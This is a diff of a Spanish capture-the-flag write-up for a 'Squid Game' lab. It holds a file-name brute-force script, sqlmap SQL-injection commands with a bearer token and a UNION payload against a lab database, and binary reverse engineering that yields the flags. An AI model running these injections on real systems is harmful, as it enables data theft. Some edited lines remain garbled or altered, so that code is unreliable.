@@ -26,6 +26,7 @@ Este CTF emula una infraestructura con temática de la serie "Squid Game".
 - 8080 (Apache + PHP)
 - 8081 (Apache + PHP)
 - 8082 (Nginx)
+- 8090 (filtrado)
 ---
 ## Flag 1 -- Server Side Template Injection (SSTi) 
 
@@ -80,18 +81,18 @@ def check_filename(player, game_round, retries=3):
         try:
             response = requests.get(url, timeout=3, cookies=c)
             if response.status_code == 200:
-                print(f"[image_desc](img] Encontrado: {url}")
+                print(f"Encontrado: {url}")
                 exit(0)
             else:
-                return f"[image_desc](img] {url} -> {response.status_code}"
+                return f"{url} -> {response.status_code}"
         except requests.exceptions.RequestException as e:
             if attempt < retries:
-                print(f"[image_desc](img] Error con {url}, reintentando ({attempt}/{retries})...")
+                print(f"Error con {url}, reintentando ({attempt}/{retries})...")
             else:
-                return f"[image_desc](img] Error persistente con {url}: {e}"
+                return f"Error persistente con {url}: {e}"
 
 def main():
-    tasks = [image_desc](img
+    tasks = []
     with ThreadPoolExecutor(max_workers=10) as executor:  # 10 hilos
         for player in range(1, 457):  # 001 a 456
             for game_round in range(1, 7):  # 1 a 6
@@ -176,14 +177,14 @@ Con `sqlmap` podemos ver la base de datos `organsdb`:
 sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" --dbs -v 0  
         ___
        __H__
- ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](img]     | .'| . |
-|___|_  [image_desc](img]_|_|_|__,|  _|
+ ___ ___[]_____ ___ ___  {1.8.11#stable}
+|_ -| . []     | .'| . |
+|___|_  []_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](img] starting @ 21:42:11 /2025-11-27/
+[] starting @ 21:42:11 /2025-11-27/
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -202,15 +203,15 @@ Parameter: name (GET)
 ---
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-available databases [image_desc](img]:
-[image_desc](img] information_schema
-[image_desc](img] mysql
-[image_desc](img] organsdb
-[image_desc](img] performance_schema
-[image_desc](img] sys
+available databases [!]:
+[] information_schema
+[] mysql
+[] organsdb
+[] performance_schema
+[] sys
 
 
-[image_desc](img] ending @ 21:42:13 /2025-11-27/
+[] ending @ 21:42:13 /2025-11-27/
 
 ```
 
@@ -221,14 +222,14 @@ $ sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authoriza
 --tables -v 0
         ___
        __H__
- ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](img]     | .'| . |
-|___|_  [image_desc](img]_|_|_|__,|  _|
+ ___ ___[]_____ ___ ___  {1.8.11#stable}
+|_ -| . []     | .'| . |
+|___|_  []_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](img] starting @ 21:42:57 /2025-11-27/
+[] starting @ 21:42:57 /2025-11-27/
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -248,7 +249,7 @@ Parameter: name (GET)
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
 Database: organsdb
-[image_desc](img tables]
+[tables]
 +----------+
 | messages |
 | organs   |
@@ -256,7 +257,7 @@ Database: organsdb
 +----------+
 
 
-[image_desc](img] ending @ 21:42:59 /2025-11-27/
+[!] ending @ 21:42:59 /2025-11-27/
 ```
 
 Luego con `sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages --columns` identificamos las columnas `hint` y `flag`. Volcamos la quinta flag:
@@ -265,17 +266,17 @@ Luego con `sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="
  sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
         ___
        __H__
- ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](img]     | .'| . |
-|___|_  [image_desc](img]_|_|_|__,|  _|
+ ___ ___[]_____ ___ ___  {1.8.11#stable}
+|_ -| . []     | .'| . |
+|___|_  []_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](img] starting @ 21:46:39 /2025-11-27/
+[] starting @ 21:46:39 /2025-11-27/
 
-[image_desc](img1:46:39] [image_desc](imgNFO] resuming back-end DBMS 'mysql'
-[image_desc](img1:46:39] [image_desc](imgNFO] testing connection to the target URL
+[1:46:39] [INFO] resuming back-end DBMS 'mysql'
+[1:46:39] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: name (GET)
@@ -291,26 +292,26 @@ Parameter: name (GET)
     Title: Generic UNION query (NULL) - 3 columns
     Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
 ---
-[image_desc](img1:46:41] [image_desc](imgNFO] the back-end DBMS is MySQL
+[1:46:41] [NFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-[image_desc](img1:46:41] [image_desc](imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
+[1:46:41] [NFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
 Database: organsdb
 Table: messages
-[image_desc](img entry]
+[ entry]
 +----------------------------------------+
 | flag                                   |
 +----------------------------------------+
 | flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
 +----------------------------------------+
 
-[image_desc](img1:46:44] [image_desc](imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
-[image_desc](img1:46:44] [image_desc](imgARNING] HTTP error codes detected during run:
+[1:46:44] [NFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
+[1:46:44] [ARNING] HTTP error codes detected during run:
 400 (Bad Request) - 2 times
-[image_desc](img1:46:44] [image_desc](imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
-[image_desc](img1:46:44] [image_desc](imgARNING] your sqlmap version is outdated
+[1:46:44] [NFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
+[1:46:44] [ARNING] your sqlmap version is outdated
 
-[image_desc](img] ending @ 21:46:44 /2025-11-27/
+[] ending @ 21:46:44 /2025-11-27/
 ```
 
 ## Flag 5 -- Port knocking
@@ -320,17 +321,17 @@ Volcamos la columna `hint` de la tabla `messages`:
  sqlmap -u "http://172.16.50.86:8082/api/organs?name=a" \  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoid29ya2VyIiwic3ViIjoicGxheWVyNDU2IiwiaWF0IjoxNzY0Mjk2MzI1LCJleHAiOjE3NjQyOTk5MjV9.DejOZ8Gj3EwAizlS2avMbPch3QHwhkXJkHR6tvddfIs" -D organsdb -T messages -C flag --dump
         ___
        __H__
- ___ ___[image_desc](img]_____ ___ ___  {1.8.11#stable}
-|_ -| . [image_desc](img]     | .'| . |
-|___|_  [image_desc](img]_|_|_|__,|  _|
+ ___ ___[]_____ ___ ___  {1.8.11#stable}
+|_ -| . []     | .'| . |
+|___|_  []_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[image_desc](img] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[image_desc](img] starting @ 21:46:39 /2025-11-27/
+[] starting @ 21:46:39 /2025-11-27/
 
-[image_desc](img1:46:39] [image_desc](imgNFO] resuming back-end DBMS 'mysql'
-[image_desc](img1:46:39] [image_desc](imgNFO] testing connection to the target URL
+[1:46:39] [INFO] resuming back-end DBMS 'mysql'
+[1:46:39] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
 Parameter: name (GET)
@@ -346,26 +347,26 @@ Parameter: name (GET)
     Title: Generic UNION query (NULL) - 3 columns
     Payload: name=a' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x4f78456b715463764f6752596954544d767246596b6b45726679505a634a5064447266776b454545,0x71766a7171),NULL-- -
 ---
-[image_desc](img1:46:41] [image_desc](imgNFO] the back-end DBMS is MySQL
+[1:46:41] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.28.0
 back-end DBMS: MySQL 8
-[image_desc](img1:46:41] [image_desc](imgNFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
+[1:46:41] [INFO] fetching entries of column(s) 'flag' for table 'messages' in database 'organsdb'
 Database: organsdb
 Table: messages
-[image_desc](img entry]
+[ entry]
 +----------------------------------------+
 | flag                                   |
 +----------------------------------------+
 | flag{0rg4n$_f0r_$4l3_$qu1d_g4m3_5tyl3} |
 +----------------------------------------+
 
-[image_desc](img1:46:44] [image_desc](imgNFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
-[image_desc](img1:46:44] [image_desc](imgARNING] HTTP error codes detected during run:
+[1:46:44] [INFO] table 'organsdb.messages' dumped to CSV file '/home/kalcast/.local/share/sqlmap/output/172.16.50.86/dump/organsdb/messages.csv'
+[1:46:44] [WARNING] HTTP error codes detected during run:
 400 (Bad Request) - 2 times
-[image_desc](img1:46:44] [image_desc](imgNFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
-[image_desc](img1:46:44] [image_desc](imgARNING] your sqlmap version is outdated
+[1:46:44] [INFO] fetched data logged to text files under '/home/kalcast/.local/share/sqlmap/output/172.16.50.86'
+[1:46:44] [WARNING] your sqlmap version is outdated
 
-[image_desc](img] ending @ 21:46:44 /2025-11-27/
+[] ending @ 21:46:44 /2025-11-27/
 ```
 
 Este contiene un mensaje enorme codificado en base64. Lo decodificamos:
@@ -445,7 +446,7 @@ VIPs/smali_classes2/com/squidgame/vips/DevMenuActivity.smali:519:    iput-object
 Analizamos `DevMenuActivity.smali` por su actividad sospechosa. Pasamos el código smali a un decompilador y encontramos lo siguiente:
 ```java
     public final String getRequiredSecret() {
-        byte[image_desc](img decode = Base64.decode("c2ViYWdfem5hX2ZycGVyZ19ucHByZmZfeHJs", 2);
+        byte[] decode = Base64.decode("c2ViYWdfem5hX2ZycGVyZ19ucHByZmZfeHJs", 2);
         Intrinsics.checkNotNull(decode);
         Charset charset = StandardCharsets.UTF_8;
         Intrinsics.checkNotNullExpressionValue(charset, "UTF_8");
@@ -516,19 +517,19 @@ Analizando el binario con permisos SUID en Ghidra vemos que contiene la cadena "
 ```C
     iVar1 = strcmp(_plaintext_pass,input);
     if (iVar1 == 0) {
-      _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b10;
+      _argv[num_blocks * -2 + num_blocks2 * -2] = (char **)0x101b10;
       lVar2 = dlopen(&lib_name,1);
       local_68 = lVar2;
       if (lVar2 == 0) {
-        _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b3e;
+        _argv[num_blocks * -2 + num_blocks2 * -2] = (char **)0x101b3e;
         fwrite("Failed to load lib:",1,0x13,stderr);
       }
       else {
-        _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b5b;
+        _argv[num_blocks * -2 + num_blocks2 * -2] = (char **)0x101b5b;
         run_helper_address = (code *)dlsym(lVar2,&local _f8);
         local_70 = run_helper_address;
         if (run_helper_address != (code *)0x0) {
-          _argv[image_desc](imgum_blocks * -2 + num_blocks2 * -2] = (char **)0x101b9b;
+          _argv[num_blocks * -2 + num_blocks2 * -2] = (char **)0x101b9b;
           (*run_helper_address)();
           return 0;
         }
@@ -582,7 +583,7 @@ void transform(char *expected_str,long addr)
   blocks = ((long)__len_expected_int + 15U) / 16;
   local_40 = (undefined *)(&__param2 + blocks * -2);
   for (i = 0; i < __len_expected_int; i = i + 1) {
-    *(char *)((long)&__param2 + (long)i + blocks * -0x1 0) = _expected_str[image_desc](img];
+    *(char *)((long)&__param2 + (long)i + blocks * -0x1 0) = _expected_str[i];
   }
   local_48 = (long)__len_expected_int + -1;
   num_16_byte_blocks = ((long)__len_expected_int + 0xf U) / 0x10;
@@ -591,29 +592,29 @@ void transform(char *expected_str,long addr)
   num_16_bytes_block_ = ((long)__len_expected_int + 0 xfU) / 0x10;
   local_60 = (undefined *)
              (&__param2 + blocks * -2 + num_16_byte_block s * -2 + num_16_bytes_block_ * -2);
-  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101522;
+  (&uStack_80)[blocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101522;
   fun1(__expected_str,&__param2 + blocks * -2 + num_ 16_byte_blocks * -2,len_expected & 0xffffffff);
   another_len = __len_expected_int;
   addr_ = some_address;
-  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101533;
+  (&uStack_80)[blocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101533;
   fun2(addr_,another_len);
   another_len = __len_expected_int;
   addr_ = some_address;
-  (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101544;
+  (&uStack_80)[blocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101544;
   another_len = fun3(addr_,another_len);
   if (another_len != 42) {
     for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
       for (k = 0; k < __len_expected_int; k = k + 1) {
-        uVar1 = local_40[image_desc](img];
+        uVar1 = local_40[k];
         another_len = k % 8;
         local_61 = uVar1;
-        (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
+        (&uStack_80)[blocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
         bVar2 = fun4(uVar1,another_len);
-        local_40[image_desc](img] = bVar2 ^ 0x4f;
+        local_40[k] = bVar2 ^ 0x4f;
       }
     }
     for (j = 0; j < __len_expected_int; j = j + 1) {
-      *(undefined *)(__param2 + j) = local_40[image_desc](img];
+      *(undefined *)(__param2 + j) = local_40[k];
     }
   }
   return;
@@ -675,16 +676,16 @@ Hay varios puntos a tener en cuenta:
   if (_var != 42) {
     for (local_20 = 0; local_20 < 44; local_20 = local_20 + 1) {
       for (k = 0; k < __len_expected_int; k = k + 1) {
-        uVar1 = local_40[image_desc](img];
+        uVar1 = local_40[k];
         _var = k % 8;
         local_61 = uVar1;
-        (&uStack_80)[image_desc](imglocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
+        (&uStack_80)[blocks * -2 + num_16_byte_blocks * -2 + num_16_bytes_block_ * -2] = 0x101592;
         bVar2 = fun4(uVar1,_var);
-        local_40[image_desc](img] = bVar2 ^ 0x4f;
+        local_40[k] = bVar2 ^ 0x4f;
       }
     }
     for (j = 0; j < __len_expected_int; j = j + 1) {
-      *(undefined *)(__param2 + j) = local_40[image_desc](img];
+      *(undefined *)(__param2 + j) = local_40[j];
     }
 ```
 - `fun4` sí hace algo relevante, es un ROR.
@@ -705,14 +706,14 @@ def transform_2_1_inverse(b, n):
 def transform_2_inverse(input,len):
     for _ in range(44):
         for k in range(len):
-            input[image_desc](img] ^= 0x4f
-            input[image_desc](img] = transform_2_1_inverse(input[image_desc](img], k % 8)
+            input[k] ^= 0x4f
+            input[k] = transform_2_1_inverse(input[k], k % 8)
     return input
 
 def transform_1_inverse(input,len):
     for i in range(len):
-        # Revertir input[image_desc](img] = (expected[image_desc](img] * ord('\r') ^ 0xaa)
-        input[image_desc](img] = (input[image_desc](img] ^ 0xaa) // ord('\r')
+        # Revertir input[i] = (expected[i] * ord('\r') ^ 0xaa)
+        input[i] = (input[i] ^ 0xaa) // ord('\r')
         print(input)
     return input
 
@@ -753,3 +754,4 @@ flag{m4sk3d_m4n_c0ntr0l_3ntry}
 flag{fr0nt_m4n_s3cr3t_4((355_k3y}
 flag{Th3_G@m3_Will_N0t_End_unl3ss_Th3_W0rld_Ch@ng3s}
 ```
+
